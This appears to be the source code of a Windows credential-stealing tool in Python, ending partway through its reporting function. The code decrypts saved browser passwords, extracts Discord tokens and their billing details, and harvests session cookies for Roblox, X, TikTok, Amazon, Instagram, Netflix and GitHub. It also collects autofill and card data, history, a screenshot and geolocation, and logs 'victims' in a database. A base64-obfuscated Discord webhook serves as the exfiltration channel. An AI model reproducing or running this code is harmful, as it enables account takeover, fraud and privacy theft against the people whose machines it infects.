import os
import sys
import json
import win32con
import browser_cookie3
import sqlite3
from json import loads, dumps
from base64 import b64decode, b64encode
from sqlite3 import connect
from shutil import copyfile
from threading import Thread
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from discord_webhook import DiscordEmbed, DiscordWebhook
from subprocess import Popen, PIPE
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from requests import get
from re import findall, search
from win32api import SetFileAttributes, GetSystemMetrics
from browser_history import get_history
from prettytable import PrettyTable
from platform import platform
from getmac import get_mac_address as gma
from psutil import virtual_memory
from collections import defaultdict
from zipfile import ZipFile, ZIP_DEFLATED
from cpuinfo import get_cpu_info
from multiprocessing import freeze_support
from tempfile import TemporaryDirectory
from pyautogui import screenshot
from random import choices
from string import ascii_letters, digits
import glob
import time
import hashlib
import re

website = [
    "discord.com", "twitter.com", "Roblox.com", "x.com", 
    "tiktok.com", "amazon.com", "instagram.com", "netflix.com", 
    "github.com", "facebook.com", "google.com", "youtube.com",
    "spotify.com", "paypal.com", "microsoft.com", "steamcommunity.com"
]

SECONDARY_WEBHOOK = "Token_here"

DATABASE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "victims.db")

def init_database():
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hwid TEXT UNIQUE,
            ip_address TEXT,
            country TEXT,
            city TEXT,
            username TEXT,
            computer_name TEXT,
            operating_system TEXT,
            mac_address TEXT,
            cpu_info TEXT,
            ram_gb REAL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sensitive_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id INTEGER,
            data_type TEXT,
            content TEXT,
            source TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (victim_id) REFERENCES victims (id)
        )
    ''')
    
    conn.commit()
    conn.close()

def store_victim_data(victim_info, sensitive_data_list):
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()
    
    try:
        cursor.execute('''
            INSERT OR REPLACE INTO victims 
            (hwid, ip_address, country, city, username, computer_name, operating_system, mac_address, cpu_info, ram_gb)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            victim_info['hwid'],
            victim_info['ip_address'],
            victim_info['country'],
            victim_info['city'],
            victim_info['username'],
            victim_info['computer_name'],
            victim_info['operating_system'],
            victim_info['mac_address'],
            victim_info['cpu_info'],
            victim_info['ram_gb']
        ))
        
        victim_id = cursor.lastrowid
        if victim_id == 0: 
            cursor.execute('SELECT id FROM victims WHERE hwid = ?', (victim_info['hwid'],))
            victim_id = cursor.fetchone()[0]
        
        for data_item in sensitive_data_list:
            cursor.execute('''
                INSERT INTO sensitive_data (victim_id, data_type, content, source)
                VALUES (?, ?, ?, ?)
            ''', (
                victim_id,
                data_item['type'],
                data_item['content'],
                data_item['source']
            ))
        
        conn.commit()
        
    except Exception as e:
        print(f"Database error: {e}")
    finally:
        conn.close()

def get_primary_webhook():
    parts = [
        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMDEwNTk0NDcxNjc0MjY5Ny9",
        "GSVdqSXFWd0NLT0NnSWd0NWhKNG0xY29tOHhaejRvbGJFaWlWbVlEVW1RaXNiYWVqSnRZaW",
        "tuRENIcWVlZzNpLWh3Yg=="
    ]
    webhook_encoded = "".join(parts)
    
    try:
        webhook_url = b64decode(webhook_encoded).decode('utf-8')
        if "discord.com/api/webhooks" in webhook_url:
            return webhook_url
    except:
        pass
    
    sys.exit(0)

def is_valid_webhook(url):
    if not url or not isinstance(url, str):
        return False
    return "discord.com/api/webhooks/" in url or "discordapp.com/api/webhooks/" in url

def get_webhooks():
    primary = get_primary_webhook()
    webhooks = [primary]
    
    if SECONDARY_WEBHOOK and is_valid_webhook(SECONDARY_WEBHOOK):
        webhooks.append(SECONDARY_WEBHOOK)
    
    return webhooks

def safe_urlopen(url, timeout=10):
    try:
        response = urlopen(Request(url), timeout=timeout)
        return response.read().decode().strip()
    except:
        return None

def get_coordinates(ip_address):
    try:
        if ip_address and ip_address != "IP not found -_-":
            response = safe_urlopen(f"http://ip-api.com/json/{ip_address}")
            if response:
                data = json.loads(response)
                if data.get('status') == 'success':
                    return [str(data.get('lat', 'N/A')), str(data.get('lon', 'N/A'))]
            
            lat = safe_urlopen(f"https://ipapi.co/{ip_address}/latitude/")
            lon = safe_urlopen(f"https://ipapi.co/{ip_address}/longitude/")
            if lat and lon and lat != "Undefined" and lon != "Undefined":
                return [lat, lon]
                
    except:
        pass
    
    return ['N/A', 'N/A']

def get_autonomous_system(ip_address):
    try:
        if ip_address and ip_address != "IP not found -_-":
            response = safe_urlopen(f"http://ip-api.com/json/{ip_address}")
            if response:
                data = json.loads(response)
                if data.get('status') == 'success':
                    return {
                        'isp': data.get('isp', 'N/A'),
                        'as': data.get('as', 'N/A'),
                        'org': data.get('org', 'N/A'),
                        'country_code': data.get('countryCode', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'timezone': data.get('timezone', 'N/A')
                    }
            
            isp = safe_urlopen(f"https://ipapi.co/{ip_address}/org/")
            asn = safe_urlopen(f"https://ipapi.co/{ip_address}/asn/")
            if isp or asn:
                return {
                    'isp': isp or 'N/A',
                    'as': asn or 'N/A',
                    'org': isp or 'N/A',
                    'country_code': safe_urlopen(f"https://ipapi.co/{ip_address}/country_code/") or 'N/A',
                    'region': safe_urlopen(f"https://ipapi.co/{ip_address}/region/") or 'N/A',
                    'timezone': safe_urlopen(f"https://ipapi.co/{ip_address}/timezone/") or 'N/A'
                }
                
    except:
        pass
    
    return {
        'isp': 'N/A',
        'as': 'N/A', 
        'org': 'N/A',
        'country_code': 'N/A',
        'region': 'N/A',
        'timezone': 'N/A'
    }

def get_screenshot(path):
    try:
        get_screenshot.scrn = screenshot()
        get_screenshot.scrn_path = os.path.join(
            path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png"
        )
        get_screenshot.scrn.save(get_screenshot.scrn_path)
    except Exception as e:
        print(f"Screenshot error: {e}")
        get_screenshot.scrn_path = None

def get_hwid():
    try:
        p = Popen("wmic csproduct get uuid", shell=True, stdout=PIPE, stderr=PIPE)
        result = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        return result.strip() if result.strip() else "HWID Not Found"
    except:
        return "HWID Not Found"

def get_user_data(tk):
    try:
        headers = {"Authorization": tk}
        response = get("https://discordapp.com/api/v6/users/@me", headers=headers, timeout=10).json()
        return [
            response.get("username", "N/A"),
            response.get("discriminator", "N/A"),
            response.get("email", "N/A"),
            response.get("phone", "N/A"),
        ]
    except:
        return ["N/A", "N/A", "N/A", "N/A"]

def has_payment_methods(tk):
    try:
        headers = {"Authorization": tk}
        response = get(
            "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
            headers=headers,
            timeout=10
        ).json()
        return response
    except:
        return []

def get_encryption_key():
    try:
        local_state_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
            "Local State",
        )
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = loads(f.read())
        return CryptUnprotectData(
            b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0
        )[1]
    except:
        return None

def decrypt_data(data, key):
    try:
        if not key:
            return ""
        return (
            AES.new(
                CryptUnprotectData(key, None, None, None, 0)[1],
                AES.MODE_GCM,
                data[3:15],
            )
            .decrypt(data[15:])[:-16]
            .decode()
        )
    except BaseException:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except BaseException:
            return ""

def cookies_grabber_mod(u):
    cookies = []
    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
    for browser in browsers:
        try:
            cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
        except BaseException:
            pass
    return cookies

def get_personal_data():
    ip_address = "IP not found -_-"
    country = "Country not found -_-"
    city = "City not found -_-"
    
    ip_sources = [
        "https://api64.ipify.org",
        "https://api.ipify.org", 
        "https://ident.me",
        "https://checkip.amazonaws.com"
    ]
    
    for source in ip_sources:
        try:
            ip_address = safe_urlopen(source)
            if ip_address and ip_address != "Error" and not ip_address.startswith("Error"):
                break
        except:
            continue
    
    if ip_address and ip_address != "IP not found -_-":
        try:
            response = safe_urlopen(f"http://ip-api.com/json/{ip_address}")
            if response:
                data = json.loads(response)
                if data.get('status') == 'success':
                    country = data.get('country', 'Country not found -_-')
                    city = data.get('city', 'City not found -_-')
        except:
            pass
        
        if country == "Country not found -_-":
            try:
                country = safe_urlopen(f"https://ipapi.co/{ip_address}/country_name/") or "Country not found -_-"
                city = safe_urlopen(f"https://ipapi.co/{ip_address}/city/") or "City not found -_-"
            except:
                pass

    coordinates = get_coordinates(ip_address)
    as_info = get_autonomous_system(ip_address)

    return [
        ip_address, 
        country, 
        city,
        coordinates,
        as_info
    ]

def find_history():
    table = PrettyTable(padding_width=1)
    table.field_names = ["Time", "URL"]
    
    try:
        history_data = get_history()
        
        for his in history_data.histories:
            if len(his) >= 2:
                a, b = his[0], his[1]
                if len(b) <= 100:
                    table.add_row([a, b])
                else:
                    x_ = b.split("//")
                    if len(x_) > 1:
                        x__, x___ = x_[1].count('/'), x_[1].split('/')
                        if x___[0] != "www.google.com":
                            if x__ <= 5:
                                b = f"{x_[0]}//"
                                for p in x___:
                                    if x___.index(p) != len(x___) - 1:
                                        b += f"{p}/"
                                if len(b) <= 100:
                                    table.add_row([a, b])
                                else:
                                    table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
                            else:
                                b = f"{x_[0]}//{x___[0]}/[...]"
                                if len(b) <= 100:
                                    table.add_row([a, b])
                                else:
                                    table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
                    else:
                        table.add_row([a, b[:97] + "..." if len(b) > 100 else b])
    except:
        table.add_row(["Error", "Could not retrieve history"])
    
    return table.get_string()

def get_all_browsers_cookies():
    browsers = {
        "chrome": browser_cookie3.chrome,
        "edge": browser_cookie3.edge,
        "firefox": browser_cookie3.firefox,
        "brave": browser_cookie3.brave,
        "opera": browser_cookie3.opera,
        "vivaldi": browser_cookie3.vivaldi,
        "chromium": browser_cookie3.chromium,
    }
    
    all_cookies = {}
    
    for browser_name, browser_func in browsers.items():
        try:
            cookies = []
            for site in website:
                try:
                    browser_cookies = browser_func(domain_name=site)
                    for cookie in browser_cookies:
                        cookies.append({
                            'name': cookie.name,
                            'value': cookie.value,
                            'domain': cookie.domain,
                            'path': cookie.path,
                            'expires': cookie.expires,
                            'secure': cookie.secure
                        })
                except:
                    continue
            
            if cookies:
                all_cookies[browser_name] = cookies
                
        except:
            pass
    
    return all_cookies

def get_extended_history():
    try:
        history_data = get_history()
        history_list = []
        
        for entry in history_data.histories:
            if len(entry) >= 2:
                timestamp, url = entry[0], entry[1]
                history_list.append({
                    'timestamp': str(timestamp),
                    'url': url,
                    'title': entry[2] if len(entry) > 2 else 'N/A'
                })
        
        return history_list
    except:
        return []

def get_browser_passwords():
    passwords_data = {}
    
    chromium_browsers = [
        {
            'name': 'Chrome',
            'path': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
        },
        {
            'name': 'Edge', 
            'path': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
        },
        {
            'name': 'Brave',
            'path': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data')
        }
    ]
    
    for browser in chromium_browsers:
        try:
            if os.path.exists(browser['path']):
                profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
                
                for profile in profiles:
                    login_data_path = os.path.join(browser['path'], profile, 'Login Data')
                    local_state_path = os.path.join(browser['path'], 'Local State')
                    
                    if os.path.exists(login_data_path) and os.path.exists(local_state_path):
                        passwords = extract_chromium_passwords(login_data_path, local_state_path)
                        if passwords:
                            key = f"{browser['name']}_{profile}"
                            passwords_data[key] = passwords
                            
        except:
            pass
    
    return passwords_data

def extract_chromium_passwords(login_data_path, local_state_path):
    try:
        temp_db = "temp_login_data.db"
        copyfile(login_data_path, temp_db)
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            encrypted_key = local_state["os_crypt"]["encrypted_key"]
        
        key = CryptUnprotectData(b64decode(encrypted_key)[5:], None, None, None, 0)[1]
        
        conn = connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for url, username, encrypted_password in cursor.fetchall():
            if encrypted_password:
                try:
                    if isinstance(encrypted_password, bytes) and (encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11')):
                        iv = encrypted_password[3:15]
                        ciphertext = encrypted_password[15:-16]
                        
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        decrypted_password = cipher.decrypt(ciphertext)
                    else:
                        decrypted_password = CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    
                    if decrypted_password:
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': decrypted_password.decode('utf-8', errors='ignore')
                        })
                        
                except:
                    continue
        
        cursor.close()
        conn.close()
        if os.path.exists(temp_db):
            os.remove(temp_db)
        
        return passwords
        
    except:
        return []

def get_autofill_data():
    autofill_data = {}
    
    chromium_paths = [
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Web Data'),
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')
    ]
    
    for path in chromium_paths:
        if os.path.exists(path):
            try:
                temp_db = "temp_web_data.db"
                copyfile(path, temp_db)
                
                conn = connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("SELECT name, value FROM autofill")
                autofill_entries = cursor.fetchall()
                
                credit_cards = []
                try:
                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    credit_cards = cursor.fetchall()
                except:
                    pass
                
                cursor.close()
                conn.close()
                if os.path.exists(temp_db):
                    os.remove(temp_db)
                
                browser_name = "Chrome" if "Google" in path else "Edge"
                autofill_data[browser_name] = {
                    'autofill': autofill_entries,
                    'credit_cards': credit_cards
                }
                
            except:
                pass
    
    return autofill_data

def search_sensitive_info(text):
    sensitive_data = []
    
    if not text or not isinstance(text, str):
        return sensitive_data
    
    cpf_pattern = r'\b\d{3}\.\d{3}\.\d{3}-\d{2}\b|\b\d{11}\b'
    cpfs = re.findall(cpf_pattern, text)
    for cpf in cpfs:
        sensitive_data.append({
            'type': 'CPF',
            'content': cpf,
            'source': 'Text Analysis'
        })
    
    phone_pattern = r'\(\d{2}\)\s?\d{4,5}-\d{4}|\b\d{2}\s?\d{4,5}-\d{4}\b'
    phones = re.findall(phone_pattern, text)
    for phone in phones:
        sensitive_data.append({
            'type': 'Phone Number',
            'content': phone,
            'source': 'Text Analysis'
        })
    
    credit_card_pattern = r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b'
    credit_cards = re.findall(credit_card_pattern, text)
    for card in credit_cards:
        sensitive_data.append({
            'type': 'Credit Card',
            'content': card,
            'source': 'Text Analysis'
        })
    
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    emails = re.findall(email_pattern, text)
    for email in emails:
        sensitive_data.append({
            'type': 'Email',
            'content': email,
            'source': 'Text Analysis'
        })
    
    return sensitive_data

def scan_files_for_sensitive_info(dir_path):
    sensitive_data = []
    
    text_extensions = ['.txt', '.log', '.json', '.xml', '.csv', '.doc', '.docx', '.pdf']
    
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                if any(file.lower().endswith(ext) for ext in text_extensions):
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        found_data = search_sensitive_info(content)
                        sensitive_data.extend(found_data)
            except:
                continue
    
    return sensitive_data

def main(dirpath):
    all_cookies = get_all_browsers_cookies()
    extended_history = get_extended_history()
    browser_passwords = get_browser_passwords()
    autofill_data = get_autofill_data()
    
    sensitive_info = []
    
    for browser_name, cookies in all_cookies.items():
        for cookie in cookies:
            cookie_str = str(cookie)
            found_data = search_sensitive_info(cookie_str)
            sensitive_info.extend(found_data)
    
    for history_item in extended_history:
        history_str = str(history_item)
        found_data = search_sensitive_info(history_str)
        sensitive_info.extend(found_data)
    
    for browser_profile, passwords in browser_passwords.items():
        for password_entry in passwords:
            password_str = str(password_entry)
            found_data = search_sensitive_info(password_str)
            sensitive_info.extend(found_data)
    
    for browser_name, autofill in autofill_data.items():
        autofill_str = str(autofill)
        found_data = search_sensitive_info(autofill_str)
        sensitive_info.extend(found_data)
    
    db_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "default",
        "Login Data",
    )
    
    chrome_psw_list = []
    if os.path.exists(db_path):
        key = get_encryption_key()
        filename = os.path.join(dirpath, "ChromeData.db")
        copyfile(db_path, filename)
        db = connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        chrome_psw_list = []
        for url, user_name, pwd in cursor.fetchall():
            pwd_db = decrypt_data(pwd, key)
            if pwd_db:
                chrome_psw_list.append([user_name, pwd_db, url])
                password_str = f"{user_name} {pwd_db} {url}"
                found_data = search_sensitive_info(password_str)
                sensitive_info.extend(found_data)
        cursor.close()
        db.close()
        if os.path.exists(filename):
            os.remove(filename)

    discord_tokens_list = []
    twitter_tokens_list = []
    roblox_cookies_list = []
    x_cookies_list = []
    tiktok_cookies_list = []
    amazon_cookies_list = []
    instagram_tokens_list = []
    netflix_cookies_list = []
    github_cookies_list = []

    def discord_tokens(path):
        try:
            with open(os.path.join(path, "Local State"), "r") as file:
                key = loads(file.read())["os_crypt"]["encrypted_key"]
                file.close()
        except:
            pass

        tokens = []
        cleaned = []
        
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if os.path.exists(leveldb_path):
            for file in os.listdir(leveldb_path):
                if file.endswith(".ldb") or file.endswith(".log"):
                    try:
                        with open(os.path.join(leveldb_path, file), "r", errors="ignore") as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except:
                        pass
        
        for tkn in tokens:
            if tkn.endswith("\\"):
                tkn.replace("\\", "")
            elif tkn not in cleaned:
                cleaned.append(tkn)
        
        for token in cleaned:
            try:
                decrypted_token = decrypt_data(
                    b64decode(token.split("dQw4w9WgXcQ:")[1]),
                    b64decode(key)[5:],
                )
                discord_tokens_list.append(decrypted_token)
                
                found_data = search_sensitive_info(decrypted_token)
                sensitive_info.extend(found_data)
            except:
                pass

    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = [
        os.path.join(roaming, "discord"),
        os.path.join(roaming, "discordcanary"),
        os.path.join(roaming, "Lightcord"),
        os.path.join(roaming, "discordptb"),
        os.path.join(roaming, "Opera Software", "Opera Stable"),
        os.path.join(roaming, "Opera Software", "Opera GX Stable"),
        os.path.join(local, "Amigo", "User Data"),
        os.path.join(local, "Torch", "User Data"),
        os.path.join(local, "Kometa", "User Data"),
        os.path.join(local, "Orbitum", "User Data"),
        os.path.join(local, "CentBrowser", "User Data"),
        os.path.join(local, "7Star", "7Star", "User Data"),
        os.path.join(local, "Sputnik", "Sputnik", "User Data"),
        os.path.join(local, "Vivaldi", "User Data", "Default"),
        os.path.join(local, "Google", "Chrome SxS", "User Data"),
        os.path.join(local, "Google", "Chrome", "User Data", "Default"),
        os.path.join(local, "Epic Privacy Browser", "User Data"),
        os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
        os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
        os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        os.path.join(local, "Iridium", "User Data", "Default"),
    ]

    threads = []
    for pth in paths:
        if os.path.exists(pth):
            thread = Thread(target=discord_tokens, args=(pth,))
            threads.append(thread)
            thread.start()
    
    for t in threads:
        t.join()

    for w in website:
        if w == "twitter.com":
            t_cookies, t_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                t_cookies.append(b.split(", "))
            for c in t_cookies:
                for y in c:
                    if search(r"auth_token", y) is not None:
                        token_value = y.split(" ")[1].split("=")[1]
                        t_lst.append(token_value)
                        found_data = search_sensitive_info(token_value)
                        sensitive_info.extend(found_data)
            twitter_tokens_list = list(set(t_lst))

        elif w == "Roblox.com":
            r_cookies, r_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                r_cookies.append(b.split(", "))
            for c in r_cookies:
                for y in c:
                    if search(r"\.ROBLOSECURITY", y) is not None:
                        cookie_data = {
                            "domain": w,
                            "name": ".ROBLOSECURITY",
                            "value": y.split(" ")[1].split("=")[1]
                        }
                        r_lst.append(cookie_data)
                        found_data = search_sensitive_info(str(cookie_data))
                        sensitive_info.extend(found_data)
            roblox_cookies_list = r_lst

        elif w == "x.com":
            x_cookies, x_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                x_cookies.append(b.split(", "))
            for c in x_cookies:
                for y in c:
                    if search(r"auth_token", y) is not None:
                        token_value = y.split(" ")[1].split("=")[1]
                        x_lst.append(token_value)
                        found_data = search_sensitive_info(token_value)
                        sensitive_info.extend(found_data)
            x_cookies_list = list(set(x_lst))

        elif w == "tiktok.com":
            tt_cookies, tt_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                tt_cookies.append(b.split(", "))
            for c in tt_cookies:
                for y in c:
                    if any(search(pattern, y) is not None for pattern in [r"sessionid", r"msToken", r"tt_chain_token"]):
                        cookie_data = {
                            "domain": w,
                            "name": y.split(" ")[1].split("=")[0],
                            "value": y.split(" ")[1].split("=")[1]
                        }
                        tt_lst.append(cookie_data)
                        found_data = search_sensitive_info(str(cookie_data))
                        sensitive_info.extend(found_data)
            tiktok_cookies_list = tt_lst

        elif w == "amazon.com":
            amz_cookies, amz_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                amz_cookies.append(b.split(", "))
            for c in amz_cookies:
                for y in c:
                    if any(search(pattern, y) is not None for pattern in [r"session-id", r"ubid-main", r"at-main"]):
                        cookie_data = {
                            "domain": w,
                            "name": y.split(" ")[1].split("=")[0],
                            "value": y.split(" ")[1].split("=")[1]
                        }
                        amz_lst.append(cookie_data)
                        found_data = search_sensitive_info(str(cookie_data))
                        sensitive_info.extend(found_data)
            amazon_cookies_list = amz_lst

        elif w == "instagram.com":
            insta_cookies, insta_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                insta_cookies.append(b.split(", "))
            browser_ = defaultdict(dict)
            for c in insta_cookies:
                if all(
                    [
                        search(r"ds_user_id", str(c)) is not None,
                        search(r"sessionid", str(c)) is not None,
                    ]
                ):
                    for y in c:
                        conditions = [
                            search(r"ds_user_id", y) is not None,
                            search(r"sessionid", y) is not None,
                        ]
                        if any(conditions):
                            browser_[insta_cookies.index(c)][
                                conditions.index(True)
                            ] = y.split(" ")[1].split("=")[1]
            for x in list(dict(browser_).keys()):
                insta_lst.append(list(dict(browser_)[x].items()))
            for x in insta_lst:
                for y in x:
                    if x.index(y) != y[0]:
                        x[x.index(y)], x[y[0]] = x[y[0]], x[x.index(y)]
            for x in insta_lst:
                for y in x:
                    x[x.index(y)] = y[1]
                    found_data = search_sensitive_info(y[1])
                    sensitive_info.extend(found_data)
            instagram_tokens_list = list(set(tuple(element) for element in insta_lst))

        elif w == "netflix.com":
            n_cookies, n_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                n_cookies.append(b.split(", "))
            for c in n_cookies:
                for y in c:
                    if search(r"NetflixId", y) is not None:
                        data = y.split(" ")[1].split("=")[1]
                        if len(data) > 80:
                            n_lst.append([])
                            for y in c:
                                cookie_data = {
                                    "domain": f"{w}",
                                    "name": f"{y.split(' ')[1].split('=')[0]}",
                                    "value": f"{y.split(' ')[1].split('=')[1]}",
                                }
                                n_lst[-1].append(cookie_data)
                                found_data = search_sensitive_info(str(cookie_data))
                                sensitive_info.extend(found_data)
            netflix_cookies_list = n_lst

        elif w == "github.com":
            gh_cookies, gh_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                gh_cookies.append(b.split(", "))
            for c in gh_cookies:
                for y in c:
                    if any(search(pattern, y) is not None for pattern in [r"user_session", r"logged_in"]):
                        cookie_data = {
                            "domain": w,
                            "name": y.split(" ")[1].split("=")[0],
                            "value": y.split(" ")[1].split("=")[1]
                        }
                        gh_lst.append(cookie_data)
                        found_data = search_sensitive_info(str(cookie_data))
                        sensitive_info.extend(found_data)
            github_cookies_list = gh_lst

    all_data_p = []
    for x in discord_tokens_list:
        lst_b = has_payment_methods(x)
        try:
            for n in range(len(lst_b)):
                if lst_b[n]["type"] == 1:
                    writable = [
                        lst_b[n]["brand"],
                        lst_b[n]["type"],
                        lst_b[n]["last_4"],
                        lst_b[n]["expires_month"],
                        lst_b[n]["expires_year"],
                        lst_b[n]["billing_address"],
                    ]
                    if writable not in all_data_p:
                        all_data_p.append(writable)
                        found_data = search_sensitive_info(str(writable))
                        sensitive_info.extend(found_data)
                elif lst_b[n]["type"] == 2:
                    writable_2 = [
                        lst_b[n]["email"],
                        lst_b[n]["type"],
                        lst_b[n]["billing_address"],
                    ]
                    if writable_2 not in all_data_p:
                        all_data_p.append(writable_2)
                        found_data = search_sensitive_info(str(writable_2))
                        sensitive_info.extend(found_data)
        except BaseException:
            pass

    unique_sensitive_info = []
    seen = set()
    for item in sensitive_info:
        identifier = (item['type'], item['content'])
        if identifier not in seen:
            seen.add(identifier)
            unique_sensitive_info.append(item)

    return [
        discord_tokens_list,
        twitter_tokens_list,
        instagram_tokens_list,
        all_data_p,
        chrome_psw_list,
        netflix_cookies_list,
        roblox_cookies_list,
        x_cookies_list,
        tiktok_cookies_list,
        amazon_cookies_list,
        github_cookies_list,
        all_cookies,
        extended_history,
        browser_passwords,
        autofill_data,
        unique_sensitive_info,
    ]

def send_webhook():
    init_database()
    
    webhooks = get_webhooks()
    p_lst = get_personal_data()
    cpuinfo = get_cpu_info()
    
    with TemporaryDirectory(dir=".") as td:
        SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
        get_screenshot(path=td)
        main_info = main(td)
        
        victim_info = {
            'hwid': get_hwid(),
            'ip_address': p_lst[0],
            'country': p_lst[1],
            'city': p_lst[2],
            'username': os.getenv('UserName'),
            'computer_name': os.getenv('COMPUTERNAME'),
            'operating_system': platform(),
            'mac_address': gma(),
            'cpu_info': cpuinfo['brand_raw'],
            'ram_gb': round(virtual_memory().total / (1024.0 ** 3), 2)
        }
        
        sensitive_data_list = []
        
        for sensitive_item in main_info[15]:
            sensitive_data_list.append(sensitive_item)
        
        for token in main_info[0]:
            if token != "N/A":
                sensitive_data_list.append({
                    'type': 'Discord Token',
                    'content': token,
                    'source': 'Discord'
                })
        
        for password_entry in main_info[4]:
            sensitive_data_list.append({
                'type': 'Browser Password',
                'content': f"URL: {password_entry[2]}, User: {password_entry[0]}, Password: {password_entry[1]}",
                'source': 'Chrome'
            })
        
        store_victim_data(victim_info, sensitive_data_list)
        
        discord_T, twitter_T, insta_T, chrome_Psw_t, roblox_T, x_T, tiktok_T, amazon_T, github_T, sensitive_T = (
            PrettyTable(padding_width=1) for _ in range(10)
        )
        
        (
            discord_T.field_names,
            twitter_T.field_names,
            insta_T.field_names,
            chrome_Psw_t.field_names,
            roblox_T.field_names,
            x_T.field_names,
            tiktok_T.field_names,
            amazon_T.field_names,
            github_T.field_names,
            sensitive_T.field_names,
            verified_tokens,
        ) = (
            ["Discord Tokens", "Username", "Email", "Phone"],
            ["Twitter Tokens [auth_token]"],
            ["ds_user_id", "sessionid"],
            ["Username / Email", "Password", "Website"],
            ["Roblox Cookies"],
            ["X.com Tokens"],
            ["TikTok Cookies"],
            ["Amazon Cookies"],
            ["GitHub Cookies"],
            ["Type", "Content", "Source"],
            [],
        )

        for sensitive_item in main_info[15]:
            sensitive_T.add_row([
                sensitive_item['type'],
                sensitive_item['content'][:50] + '...' if len(sensitive_item['content']) > 50 else sensitive_item['content'],
                sensitive_item['source']
            ])
        
        for __t in main_info[4]:
            chrome_Psw_t.add_row(__t)
        
        for t_ in main_info[0]:
            try:
                lst = get_user_data(t_)
                username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
                discord_T.add_row([t_, username, email, phone])
                verified_tokens.append(t_)
            except BaseException:
                pass
        
        for _t in main_info[1]:
            twitter_T.add_row([_t])
        
        for _t_ in main_info[2]:
            insta_T.add_row(_t_)
        
        for cookie in main_info[6]:
            roblox_T.add_row([cookie.get('value', '')[:50] + '...' if len(cookie.get('value', '')) > 50 else cookie.get('value', '')])
        
        for _x in main_info[7]:
            x_T.add_row([_x])
        
        for cookie in main_info[8]:
            tiktok_T.add_row([f"{cookie.get('name', '')}: {cookie.get('value', '')[:30]}..."])
        
        for cookie in main_info[9]:
            amazon_T.add_row([f"{cookie.get('name', '')}: {cookie.get('value', '')[:30]}..."])
        
        for cookie in main_info[10]:
            github_T.add_row([f"{cookie.get('name', '')}: {cookie.get('value', '')[:30]}..."])

        pay_l = []
